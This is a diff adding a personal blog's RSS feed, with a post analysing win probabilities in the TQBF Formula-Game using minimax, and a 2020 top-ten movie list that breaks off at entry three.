@@ -1,0 +1,813 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Noah Kontur &#8211; Jack of All Trades</title>
+	<atom:link href="https://blog.nkontur.com/index.php/author/konoahko/feed/" rel="self" type="application/rss+xml" />
+	<link>https://blog.nkontur.com</link>
+	<description>(Master of Some)</description>
+	<lastBuildDate>Mon, 19 Oct 2026 14:24:27 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=7.1.3</generator>
+	<item>
+		<title>Formula-Game: Using Game Theory to Analyze the Probabilistic Features of True Quantified Boolean Formulas</title>
+		<link>https://blog.nkontur.com/index.php/2021/01/25/formula-game-using-game-theory-to-analyze-the-probabilistic-features-of-true-quantified-boolean-formulas/</link>
+					<comments>https://blog.nkontur.com/index.php/2021/01/25/formula-game-using-game-theory-to-analyze-the-probabilistic-features-of-true-quantified-boolean-formulas/#respond</comments>
+		
+		<dc:creator><![CDATA[Noah Kontur]]></dc:creator>
+		<pubDate>Mon, 25 Jan 2021 18:45:32 +0000</pubDate>
+				<category><![CDATA[Computer Science (Theoretical)]]></category>
+		<guid isPermaLink="false">https://nkontur.com/blog/?p=68</guid>
+
+					<description><![CDATA[Note: I&#8217;ve written some code which I used to verify some of the results presented in this post&#8211;you can access it here. Last semester, I took a class on the theory of computation, where I learned about computational complexity and the so-called Complexity Zoo. One of the complexity classes we considered was PSPACE, the class [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p class="has-medium-font-size wp-block-paragraph">Note: I&#8217;ve written some code which I used to verify some of the results presented in this post&#8211;you can access it <a href="https://github.com/konturn/Minimax-Formula-Game">here</a>.</p>
+
+
+
+<p class="has-normal-font-size wp-block-paragraph">Last semester, I took a class on the theory of computation, where I learned about computational complexity and the so-called <a href="https://complexityzoo.net/Complexity_Zoo">Complexity Zoo</a>. One of the complexity classes we considered was PSPACE, the class of all problems solvable in polynomial space. Within this class, there are some problems that are PSPACE-Complete; roughly speaking, these problems are at least as hard to solve as any other problem in PSPACE. As Sipster shows in his <em>Introduction to the Theory of Computation</em>, the problem of determining the truth value of a True Quantified Boolean Formula (TQBF for short) is PSPACE-Complete. As a recap, a boolean formula is an expression consisting of variables which may be true or false, along with the set of logical connectives (not ($\not$), and ($\land$), and ($\lor$), usually) which establish a relationship between these variables. Here is an example of one: </p>
+
+
+
+<p class="wp-block-paragraph">$(x_1 \land \neg x_2 \land x_3) \lor \neg x_1$</p>
+
+
+
+<p class="has-normal-font-size wp-block-paragraph">For this formula to be true, either $x_1$ must be true AND $x_2$ must be false AND $x_3$ must be true, OR $x_1$ must be false. While oblique to this particular discussion, there are many interesting and computationally difficult problems involving boolean formulas. For instance, the problem of determining whether an arbitrary boolean formula is satisfiable&#8211;that is, if there is some assignment of values to variables that make the whole formula true&#8211;is NP-Complete.</p>
+
+
+
+<p class="wp-block-paragraph">Quantified boolean formulas are just like boolean formulas, except the variables within the boolean expressions are optionally bound by quantifiers. The two quantifiers we consider today are existential ($\exists$) and universal ($\forall$). A formula with a variable bound by an existential quantifier is true if there is some assignment of the bound variable for which the entire formula true. A formula with a variable bound by an existential quantifier is true if  each assignment of the bound variable makes the entire formula true. A true quantified boolean formula is a quantified formula for which every variable is bound. For instance, we can modify the first example to get an instance of TQBF:</p>
+
+
+
+<p class="wp-block-paragraph">$\exists x_1 \forall x_2 \exists x_3 [(x_1 \land \neg x_2 \land x_3) \lor \neg x_1]$</p>
+
+
+
+<p class="wp-block-paragraph">In English, this formula translates to, &#8220;There is a choice of $x_1$ so that for any choice of $x_2$, there is a  choice of $x_3$ for which the formula is true&#8221;. Therefore, this instance of TQBF is true, since assigning $x_1$ false will always make the inner boolean formula true no matter what. </p>
+
+
+
+<p class="wp-block-paragraph">What I&#8217;d like to do here is briefly investigate the probabilistic properties of Truly Quantified Boolean Formulas. Without loss of generality, we can convert any TQBF instance to prenex normal form, which basically means pulling the quantifiers to the very outer parentheses of the boolean formula as shown in the example above. As a warmup, it is easy to show that determining the satisfiability of a regular boolean formula is equivalent to determining the truth value of the analogous TQBF instance where all the quantifiers are existential. For example, finding whether the formula $(x_1 \land \neg x_2 \land x_3) \lor \neg x_1$ has a satisfying assignment is the same as finding whether $\exists x_1 \exists x_2 \exists x_3[(x_1 \land \neg x_2 \land x_3) \lor \neg x_1]$ is true. From a probabilistic perspective, one might want to consider the chance that a random boolean formula is satisfiable. We first define a template for random selection of boolean formulas. We could certainly define randomness with respect to the formula&#8217;s symbols and variables, but this quickly becomes unwieldy. Furthermore, since there can be an arbitrary amount of variables appearing in a boolean formula, we couldn&#8217;t just uniformly select the number of variables appearing in the formula at random (how does one uniformly select a random number between 0 and infinity?). We instead opt to fix the number of variables N and randomly select outputs in the  formula&#8217;s <em>truth table</em>. For any given formula $\phi$ with N variables, there are $2^N$ entries in the truth table. For $\phi$ to not be satisfiable, we would thus require that every entry in the truth variable evaluates to false, which occurs with probability $2^{-N}$. So the probability of a random boolean formula $\phi$ being satisfiable is $1-2^{-N}$.</p>
+
+
+
+<p class="wp-block-paragraph">What about the probability that a general TQBF instance $\psi$ with underlying boolean formula $\phi$ is true? Again, we define randomness with respect to the truth table, and we also randomize whether each quantifier is existential or universal and the order in which the quantifiers appear. It actually comes out to be exactly .5. To see this, note that we can form a pretty trivial bijection between true and false instances of TQBF by mapping $\psi$ to $\neg \psi$. When the negation sign propagates through the quantifiers, it switches existential quantifiers to universal and vice versa and ends up being applied to the underlying boolean formula. Therefore, we still have a TQBF instance, and it obviously has the negated truth value of its pre-image under our negation map. The map is clearly bijective, so the probability of TQBF truth is .5 as proposed.</p>
+
+
+
+<p class="wp-block-paragraph">The final case I would like to consider is related to Formula-Game, which is described in Sipster as follows. Suppose we are given a TQBF instance $\psi$ in prenex of the form $\exists x_1 \forall x_2 &#8230; \exists x_n [\phi]$, where $\phi$ is some boolean formula. Two players play against each other. Player 1 gets to choose whether $x_1$ is true or false, and Player 2 gets to choose the truth value of $x_2$, and alternating down to n, where Player 1 gets the final assignment. Player 1 wins if the assignment is true under $\phi$, and Player 2 wins otherwise. We note that $\psi$ is true precisely when Player 1 has a winning strategy; that is, given optimal play by Player 2, Player 1 always has a way to win. This follows from the fact that Player 1&#8217;s winning strategy implies that there is a way to select $x_1$ so that, for any choice of $x_2$, Player 1 has a choice of $x_3$&#8230; and so and so forth inductively until Player 1 has a choice of $x_n$ to satisfy $\phi$. Moreover, any TQBF instance can be converted to this particular form by adding dummy variables/quantifiers, so Formula-Game is actually PSPACE-Complete as well. As a matter of curiosity, I consider the probability that Player 1 has a winning strategy for an instance of Formula-Game. The crucial insight is that Formula-Game can be modeled by a game tree, and if play is optimal for both players, then the game itself can be modeled via the <a href="https://en.wikipedia.org/wiki/Minimax">Minimax</a> algorithm. To illustrate, I convert the TQBF example above into game tree form:</p>
+
+
+
+<figure class="wp-block-image size-large"><img fetchpriority="high" decoding="async" width="1024" height="493" src="https://nkontur.com/blog/wp-content/uploads/2021/01/Blank-diagram2-1024x493.jpeg" alt="" class="wp-image-102" srcset="https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram2-1024x493.jpeg 1024w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram2-300x144.jpeg 300w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram2-768x369.jpeg 768w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram2-1536x739.jpeg 1536w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram2.jpeg 1580w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption>Game tree representation of TQBF instance given above</figcaption></figure>
+
+
+
+<p class="wp-block-paragraph">Taking a right branch at any vertex in the tree corresponds to assigning a variable true, and the left false. Leaf vertices have value 1 if the formula is true given the corresponding assignment, and 0 otherwise. Player 1 gets to choose which way to go at every odd branch, and Player 2 gets to choose which way to go at every even branch. Assuming that Player 2 is playing optimally, Player 1&#8217;s optimal strategy is to choose the branch which maximizes the end leaf value which gameplay eventually arrives at. Since Player 2 is playing optimally as well, they will minimize the utility, so that Player 1&#8217;s optimal strategy is given by the output of minimax. In this case, Player 1 clearly wins, since going left will give utility 1 no matter what Player 2 chooses.</p>
+
+
+
+<p class="wp-block-paragraph">As a base case, we consider a random instance of Formula-Game with three variables (with one variable, the probability is clearly .5). This instance will have the same structure as the example above, except the values at the leaves will be randomly chosen from {0,1}. To determine the probability that Player 1 has a winning strategy, we can alternatively compute one minus the probability that Player 2 does by <a href="https://en.wikipedia.org/wiki/Zermelo%27s_theorem_(game_theory)">Zermelo&#8217;s Theorem</a>. For Player 2 to have a winning strategy, they must have a winning strategy both in the case where play arrives at node B and node C, since Player 1 gets to choose this. If play arrives at node B, this must mean that the leaves attached to node D are both 0 or the leaves attached to node E are both zero; otherwise, Player 1 could assign a value to $x_3$ to get a value of 1. Using the inclusion exclusion principle, we note that player 2 has a winning strategy with probability $\frac{1}{4}+\frac{1}{4}-\frac{1}{16}=\frac{7}{16}$. We can use this to recursively solve for all Formula-Game instances featuring an odd number of variables. To see this, consider a game tree of depth 5. Since this game is deterministic, we can actually view this tree as having depth 3. To do so, start by taking the depth-5 tree and trunking off the final two layers. Then, make it so that each leaf of this tree will have value 1 if Player 1 has a winning strategy from this point on in the full depth-5 game tree. Give the leaf node value 0 otherwise. Note that in the base case, the probability that a leaf node had value 0 was .5 by construction.  Now, however, the value of the leaf nodes is a function of uniform random variables. To determine the probability, we consider what happens when game play reaches one of these faux leaf nodes. It will be Player 2&#8217;s move next, and they will have a winning strategy from this point on precisely when one of the two subtrees they can choose to go down has both leaves as zero. Just like above, this occurs with probability $\frac{7}{16}$. So Player 2 has a winning strategy on depth-5 subtrees with probability $2*(\frac{7}{16})^2-(\frac{7}{16})^4$. In general, it isn&#8217;t hard to extrapolate on this example to derive the recursion formula $P_n=(2*P_{n-2}-(P_{n-2})^2)^2$, where P_n is the probability that Player 2 has a winning strategy on Formula-Game instances with n variables. Furthermore, on game trees of depth 2, Player 2 has a winning strategy with probability $\frac{9}{16}$. This is because Player 1 is forced to get double 1&#8217;s in one of the two subtrees. The recursion formula works the same for even-depth subtrees, so we have derived the probabilities as desired. Examination of these probabilities reveals a rapid convergence to zero in the case where n is odd, and 1 where n is even. To show this rigorously, we formally define the map $f(x)=x^{4}-4x^{3}+4x^{2}$. Iterative applications of this map to the initial probabilities at depths 2 (or 3) yield the probability at depth 4 (or 5), 6 (or 7), and so forth. The steady states of this map occur at 0, 1, and .382. Since the derivative of f is positive at .382, we know that applying our recursive relation starting with values less than this will yield a lesser value, and vice versa. Since f is continuous, we have that each sequence consisting of iterative applications of our recursive map converges to the fixed points of f. Since $\frac{49}{256}&lt;.382$, we must have convergence to zero for odd depth. Since $\frac{9}{16}&gt;.382$, we must have convergence to 1 for even depth. It seems that whatever player goes last has the advantage. This holds even though Player 1 always goes first.</p>
+
+
+
+<p class="wp-block-paragraph">Another question to ask is: for Player 1 to have a winning strategy, what kind of configuration of leaves must exist at the bottom? To answer this, we make the claim that for Player 1 to have a winning strategy on an N-variable instance of TQBF, the underlying boolean formula $\phi$ must have at least $2^{\lfloor \frac{N}{2}\rfloor}$ satisfying assignments. Depth 1 is trivial. For depth 2, we note that one subtree must have double 1&#8217;s, so we need at least 2 ones. For depth 3, we can consider the truncated tree of depth 2 similar to how we did in proof above. In this depth 2 tree, we need double 1&#8217;s in one of the subtrees. Once gameplay in the larger depth 3 tree hits the leaves of this depth 2 tree, victory must be guaranteed for Player 1. Since Player 1 gets to play last, this means that we only need to make sure one of the leaves below each 1 in the pair in the truncated tree is also 1 (see my diagram below).</p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" width="1024" height="493" src="https://nkontur.com/blog/wp-content/uploads/2021/01/Blank-diagram4-1-1024x493.jpeg" alt="" class="wp-image-107" srcset="https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram4-1-1024x493.jpeg 1024w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram4-1-300x144.jpeg 300w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram4-1-768x369.jpeg 768w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram4-1-1536x739.jpeg 1536w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram4-1.jpeg 1580w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption>A depth-3 game tree minimal with respect to amount of 1&#8217;s at the leaves while still providing Player 1 a winning strategy. For each 1 appearing in corresponding minimal depth-2 tree, we only need one 1.</figcaption></figure>
+
+
+
+<p class="wp-block-paragraph">In essence, we are using our minimal game tree of depth 2 to construct a game tree of depth 3 also minimal with respect to 1&#8217;s at the leaves. By symmetry, we know that there is no such depth-3 tree with less 1&#8217;s at the leaves&#8211;this would contradict the fact that Player 1 has a winning strategy, since we would have three 0&#8217;s at the second layer. We can again use the same process to extend to depth 4. This time, since Player 2 moves last, we need to put two 1&#8217;s at the leaves of each subtree with a 1 as its root. In total, there are thus 4 1&#8217;s in this minimal game tree. We note that this extension process only doubles the amount of 1&#8217;s required every other time. Basically, we have to double the amount of 1&#8217;s every time we end up at a depth where Player 2 moves last. In any case, this proves our claim.</p>
+
+
+
+<p class="wp-block-paragraph">We establish a similar necessary condition for the existence of a winning strategy for Player 2. Namely, we claim that for Player 2 to have a winning strategy in Formula-Game with N variables where N is even, there can be at most $2^N(1-2^{-\frac{N}{2}})$ satisfying assignments to the underlying Boolean formula $\phi$. For depth 2, none of the bottom subtrees can have double 1&#8217;s, so we can therefore have at most 2 satisfying assignments. As above, we can use this base case to extend outwards. Wherever 1&#8217;s appear in the base tree, we are allowed to add all 1&#8217;s below it, since Player 2 is basically able to prevent play from reaching the subtree with the 1 at its root. However, we cannot add any 1&#8217;s off the subtrees with 0 at their roots, since Player 1 gets the final play. We therefore end up with at most 4 satisfying assignments to $\phi$ as shown below.</p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" width="1024" height="493" src="https://nkontur.com/blog/wp-content/uploads/2021/01/Blank-diagram5-1024x493.jpeg" alt="" class="wp-image-108" srcset="https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram5-1024x493.jpeg 1024w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram5-300x144.jpeg 300w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram5-768x369.jpeg 768w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram5-1536x739.jpeg 1536w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram5.jpeg 1580w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption>A depth-3 game tree maximal with respect to amount of 1&#8217;s at the leaves while providing Player 2 a winning strategy. For each 1 appearing in corresponding minimal depth-2 tree, we can have two 1&#8217;s in the depth-3 tree.</figcaption></figure>
+
+
+
+<p class="wp-block-paragraph">When we extend to depth 4, however, the fact Player 2 gets the final pick means that each appearance of 0 at the leaves can yield a 1 below it. Depth 4 will thus have 8+4=12 satisfying assignments. Every extension of depth doubles the existing satisfying assignments, and when the depth becomes even some leaves which were 0 yield a leaf which is 1&#8211;we denote this process as flipping. The amount of these leaves which &#8216;flip&#8217; from 0 to 1 doubles each cycle, since when we extend to an odd depth the 0 leaves multiply. With this in mind, we yield the summation $\sum_{i=1}^{\frac{N}{2}}2^i 2^{N-2i}$. The first term in the summation represents the group of 1&#8217;s that were there since depth 2 and have multiplied N-2i times since then. The second term represents the groups of 0&#8217;s that &#8216;flipped&#8217; and yielded ones when extending to depth 4, and so on and so forth. Some basic algebra (and application of the formula for partial geometric sums) yields a final solution of $2^N(1-2^{-\frac{N}{2}})$ . Note that we can use this to get the maximal amount of satisfying assignments for N odd with $2^{N+1}(1-2^{-\lfloor \frac{N}{2}\rfloor})$ since the amount of assignments are doubling but no 0&#8217;s have flipped between the last depth and the current one. </p>
+
+
+
+<p class="wp-block-paragraph">We conclude this discussion by noting two properties of TQBF which also follow from the game tree perspective. The first is that if Player 1 has a winning strategy for some TQBF instance with formula $\phi$, we cannot say anything about how they will do in the case where $\phi$ is negated. This can easily be seen by looking at the first game tree diagram. Negating the underlying formula is equivalent to swapping the 0&#8217;s and 1&#8217;s, but if we do this Player 1 still as a winning strategy, since they can take the right branch by setting $x_1$ true. However, the modified TQBF instance where each input in the truth table for $\phi$ has its value flipped leads to an equivalent game. In fact, this modification constitutes a reflection of the tree across the center line, so that the new dominant strategy for Player 1 will essentially be the opposite of what it was before. For instance, the first TQBF example which we used to illustrate the game tree approach had formula $\exists x_1 \forall x_2 \exists x_3 [(x_1 \land \neg x_2 \land x_3) \lor \neg x_1]$. The modified formula would be $\exists x_1 \forall x_2 \exists x_3 [(\neg x_1 \land x_2 \land \neg x_3) \lor  x_1]$ and has the following game tree:</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="493" src="https://nkontur.com/blog/wp-content/uploads/2021/01/Blank-diagram6-1024x493.jpeg" alt="" class="wp-image-110" srcset="https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram6-1024x493.jpeg 1024w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram6-300x144.jpeg 300w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram6-768x369.jpeg 768w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram6-1536x739.jpeg 1536w, https://blog.nkontur.com/wp-content/uploads/2021/01/Blank-diagram6.jpeg 1580w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /><figcaption>Note that Player 1&#8217;s winning strategy is simply a reflection of their old one.</figcaption></figure>
+
+
+
+<p class="wp-block-paragraph">As I said, this modification does not change the outcome of the game.</p>
+
+
+
+<p class="wp-block-paragraph">While this investigation relates only tangentially to questions of computational complexity, it provides valuable insight into the link between game theoretic concepts and probabilistic properties of first-order boolean formulas. As mentioned in a note above, I&#8217;ve written up some Python code which verifies some of my results&#8211;I&#8217;ve provided a <a href="https://github.com/konturn/Minimax-Formula-Game">link</a> to the repository if you want to check it out.</p>
+
+]]></content:encoded>
+					
+					<wfw:commentRss>https://blog.nkontur.com/index.php/2021/01/25/formula-game-using-game-theory-to-analyze-the-probabilistic-features-of-true-quantified-boolean-formulas/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>2020 Movie Recap: Top Ten</title>
+		<link>https://blog.nkontur.com/index.php/2021/01/11/2020-movie-recap-top-ten/</link>
+					<comments>https://blog.nkontur.com/index.php/2021/01/11/2020-movie-recap-top-ten/#respond</comments>
+		
+		<dc:creator><![CDATA[Noah Kontur]]></dc:creator>
+		<pubDate>Mon, 11 Jan 2021 21:17:25 +0000</pubDate>
+				<category><![CDATA[Movie Reviews]]></category>
+		<guid isPermaLink="false">https://nkontur.com/blog/?p=42</guid>
+
+					<description><![CDATA[2020 was a tempestuous year to say the least, and movies suffered for it. Many potential blockbusters slated for release were either delayed (Black Widow, A Quiet Place 2, Dune, etc.) or were huge flops (looking at you, Tenet). All things considered, I haven&#8217;t been too disappointed, as I&#8217;ve had a chance to catch up [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p class="wp-block-paragraph">2020 was a tempestuous year to say the least, and movies suffered for it. Many potential blockbusters slated for release were either delayed (<em>Black Widow, A Quiet Place 2, Dune</em>, etc.) or were huge flops (looking at you, <em>Tenet</em>). All things considered, I haven&#8217;t been too disappointed, as I&#8217;ve had a chance to catch up on some older movies I hadn&#8217;t yet gotten to. And anyways, 2020 has its fair share of solid films, if you&#8217;re willing to look hard enough. As a final 2020 sendoff, I&#8217;ve ranked my favorite movies of the year&#8211;some new, some old, (mostly) no spoilers.</p>
+
+
+
+<h3 class="wp-block-heading">10. Soul</h3>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://variety.com/wp-content/uploads/2020/12/Soul.jpg" alt="Soul' Review: Another Masterpiece From the Minds Behind 'Inside Out' -  Variety"/></figure>
+
+
+
+<p class="wp-block-paragraph">I&#8217;ve always had a soft spot for Pixar. In striking a masterful balance between depth and accessibility, their movies appeal to kids while remaining more than just palatable to adults. After watching the trailers for <em>Soul</em> a few months back, I was curious about how they would handle existential themes like death and reincarnation. Would attempts at humor demean the gravity of the subject? I had reason to believe this would not be the case, as Pete Docter, the director of <em>Soul</em>, also headed <em>Inside Out</em>, which handles a similar subject with poise. All in all, I was not disappointed. While the subject matter is pretty out there (even by Pixar standards), I never felt like the movie was condescending or inaccessible. The aesthetic complements the subject matter nicely&#8211;I particularly appreciated the Jerrys&#8217; design, which looked somewhere in between a ghost and a child&#8217;s doodle. The only major complaints I have about the film are that the villain is somewhat underwhelming (though I&#8217;m not sure the villain is meant to be the focus in the first place) and that the whole thing isn&#8217;t <em>really</em> for kids. I don&#8217;t see the latter complaint as being too problematic, though; if anything, I respect this film because it dares to venture into an existential territory that most American adults are not used to when it comes to animated film. Let&#8217;s hope that Pixar can continue to be this daring going into the future.</p>
+
+
+
+<p class="wp-block-paragraph">Memorable Moments: The Great Beyond people mover; random dude gets soul separated from body; barbershop roast; Joe in the zone</p>
+
+
+
+<h3 class="wp-block-heading">9. Oldboy</h3>
+
+
+
+<figure class="wp-block-image is-resized"><img loading="lazy" decoding="async" src="https://i.pinimg.com/originals/a0/fb/13/a0fb131ba70eb37ac7cbcb2cb21c20db.jpg" alt="Oldboy (2003) | Chan wook park, Filmes, Cinema" width="500" height="707"/></figure>
+
+
+
+<p class="wp-block-paragraph">As far as I&#8217;m concerned, Bong Joon-Ho is the king of psychological thrillers. You&#8217;ve got your <em>Parasite</em>, your <em>Memories of Murder</em>, your <em>Snowpiercer</em>, your <em>Okja</em>. Next to <em>Parasite</em> (which I watched in 2019), this has got to be my favorite. I think one of the things that these films do best is depicting unbelievable situations in a down-to-earth, believable way. Everything about this film feels so damn <em>authentic</em>. When the protagonist eats a full octopus raw (the octopus is real, by the way), the grotesqueness is just so palpable and close. Even the famous corridor fight scene, which is such an overdone trope at this point that it even makes its way into satires like <em>Kung Fury</em>, is made to be so <em>real</em> that you can&#8217;t look away. In spite of being gritty, this film also has a gorgeous aesthetic. The urban scenes are captivating, and the snowy shot in the countryside at the end is likewise beautiful in an austere way. Finally, like all of Bong Joon-Ho&#8217;s films, <em>Oldboy</em> is thematically dense, sporting mythological parallels to Oedipus Rex and more.</p>
+
+
+
+<p class="wp-block-paragraph">Memorable Moments: Grabbing the dude by the tie, eating the octopus, corridor fight, severing the tongue, final embrace.</p>
+
+
+
+<h3 class="wp-block-heading">8. Gattaca</h3>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://www.harrisonpl.org/images/events/1551730750.jpg" alt="Film: GATTACA · Halperin Building"/></figure>
+
+
+
+<p class="wp-block-paragraph">There is something very distinct about the late 90&#8217;s-early 2000s brand of Sci-Fi (think <em>Men in Black, Minority Report</em>, <em>The Matrix</em>, and <em>I, Robot</em>). In a time where technology was advancing faster than many people could understand or fathom, questions of identity and reality in the face of an uncertain future dominated these films. I think <em>Gattaca</em> is a fine edition to this collection and is unique enough to deserve consideration. Besides featuring particularly strong performances from Ethan Hawke and Jude Law, the film poignantly reaffirms the sanctity of free will in the face of game-changing advancements in genetics. While the film may have verged on triteness in worse hands, the plot was interesting and the characters were believable enough that the thought didn&#8217;t even cross my mind. </p>
+
+
+
+<p class="wp-block-paragraph">Memorable Moments: swimming competition, scrubbing off hair, final scene</p>
+
+
+
+<h3 class="wp-block-heading">7. Little Women</h3>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://media1.s-nbcnews.com/i/newscms/2019_51/3157646/191220-saoirse-ronan-timothee-chalamet-little-women-ac-1146p_58473511b2fdbc90e6c23026c203da63.jpg" alt="Greta Gerwig's 'Little Women' is the adaptation every Jo March always needed"/></figure>
+
+
+
+<p class="wp-block-paragraph">Having read the novel, one of the worries I had going into this was that it would come off as a glorified Hallmark movie (to be fair, I haven&#8217;t watched the 1994 adaptation, which I&#8217;ve heard is pretty solid). This was anything but that. First of all, the talent in this movie is insane. Saorishe Ronan, who plays Jo, is an exemplar of the modern Bildungsroman protagonist, appearing in recent films such as <em>Brooklyn</em> and <em>Lady Bird</em>. Then there&#8217;s Timothée Chalamet as Laurie, whose (for lack of a better word) noble aesthetic shows in his performance (I am very, very excited to see his performance as Paul Atreides in <em>Dune</em>). Florence Pugh, who you may know as the star of <em>Midsommar </em>(waves hands wildly) brings a characteristic cold serenity as Amy. Honorable mentions to Laura Dern, Meryl Streep, and Emma Watson. Like I said. But that&#8217;s not all this movie has to offer. In addition to featuring a wide array of colorful and historically accurate (at least to my untrained eye) set pieces, the film retells an old story in a modern light. I particularly like how they present Jo as a strong female lead, and I was enthralled by the way they flash backwards and forwards throughout the film. The latter choice pays off with one of the most gut-wrenching scenes I&#8217;ve watched in a while. All in all, solid film.</p>
+
+
+
+<p class="wp-block-paragraph">Memorable Moments: Scene with Beth on the beach; Jo rejecting Laurie; Christmas Day</p>
+
+
+
+<h3 class="wp-block-heading">6. Secret of Kells</h3>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://s3.amazonaws.com/burnsfilm-prod/images/000/001/391/extra_large/20141015171906-secret-of-kells-cover.jpg" alt="The Secret of Kells | JBFC EDU"/></figure>
+
+
+
+<p class="wp-block-paragraph">Since Disney seems to have taken a prejudicial stance towards 2D-animation as of late (R.I.P. <em>Treasure Planet</em>), it&#8217;s often hard to find good traditional animated feature films outside of Japan. <em>Secret of Kells</em>, which is produced by an Irish company, checks all these boxes. What I particularly enjoyed about this film is the unique way it leverages its medium to tell a story rooted in Celtic mythology. The animation is characterized by ornate, geometric patterns appropriately reminiscent of an illuminated manuscript. The way in which the film looks like a series of medieval paintings transports the audience back to a time of mystery, when nature was seen as both a malevolent force of destruction and a means to salvation. Interestingly the film does not shy away from violence, and it seems to approach storytelling in the traditional fairy tale sense&#8211;bad things happen, people die. Definitely worth watching, if only for the fact that it constitutes a radical and successful departure from what American audience have come to expect from animation.</p>
+
+
+
+<p class="wp-block-paragraph">Memorable Moments: Viking raid, Eye of Crom fight, reveal of the Book of Kells</p>
+
+
+
+<h3 class="wp-block-heading">5. Dangal</h3>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://img.jakpost.net/c/2017/01/25/2017_01_25_20103_1485341988._large.jpg" alt="Dangal', a potent and palpable sports drama - Entertainment - The Jakarta  Post"/></figure>
+
+
+
+<p class="wp-block-paragraph">Gotta love me some Amir Khan. Ever since I watched <em>Three Idiots</em> a few years back, I was hooked. The expertise with which he presents such a foreign mode of life in a way that is both authentic and relatable to a western audience cannot be understated. Another thing I love about Khan&#8217;s films is they&#8217;ve got a bit of everything. While <em>Dangal</em> is a sports movie, it also features a healthy dose of social commentary and, of course, singing. I do remember thinking that the portrayal of Geeta&#8217;s coach was kind of one-dimensional, but I think that synergizes well with the theatrical tone of the film. Where there&#8217;s smoke, there&#8217;s fire. Where there&#8217;s theatre, there&#8217;s a villain. Addressing the social commentary part, I was impressed at how the film addresses gender biases in sports without letting the message overpower what is at its essence a good story.</p>
+
+
+
+<p class="wp-block-paragraph">Memorable Moments: Their heads being shaved, Geeta wrestling her father, the whole final sequence</p>
+
+
+
+<h3 class="wp-block-heading">4. Casino Royale</h3>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://www.moma.org/d/assets/W1siZiIsIjIwMjAvMDIvMDcvbGd0ZjAybHR4X0Nhc2lub19Sb3lhbGVfMS5qcGciXSxbInAiLCJjb252ZXJ0IiwiLXF1YWxpdHkgOTAgLXJlc2l6ZSAyMDAweDIwMDBcdTAwM2UiXV0/Casino-Royale-1.jpg?sha=66e139341a41274b" alt="Casino Royale. 2006. Directed by Martin Campbell | MoMA"/></figure>
+
+
+
+<p class="wp-block-paragraph">I always have this issue when I watch a big-budget action film. I watch the film and I enjoy it, I really do, but if you ask me about it 3 weeks later I won&#8217;t remember a thing. Right from the opening credits (probably one of my favorite opening sequences in any movie, by the way) I knew <em>Casino Royale</em> would be different. While the action is pretty cool&#8211;who <em>doesn&#8217;t</em> love a good parkour chase sequence?&#8211;it serves as only one of many ingredients in a tasty Bond cocktail (shaken, not stirred). While I can&#8217;t speak for the other Bond films (and I haven&#8217;t gotten around to reading Fleming yet, either), I can definitively say that Craig captures the Bond persona excellently. His suave demeanor and campy one-liners take an otherwise enjoyable but unmemorable film and make it unforgettable.</p>
+
+
+
+<p class="wp-block-paragraph">Memorable Moments: Opening sequence, high-stakes poker game, carjacking, poison, finale in Venice</p>
+
+
+
+<h3 class="wp-block-heading">3. Palm Springs</h3>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://cdn.vox-cdn.com/thumbor/usz0IGdKzYtVGivsqKntepTdcTY=/1400x1050/filters:format(png)/cdn.vox-cdn.com/uploads/chorus_asset/file/20082803/Screen_Shot_2020_07_14_at_9.56.41_AM.png" alt="Palm Springs review: the perfect comedy for a world where nothing matters  anymore - The Verge"/></figure>
+
+
+
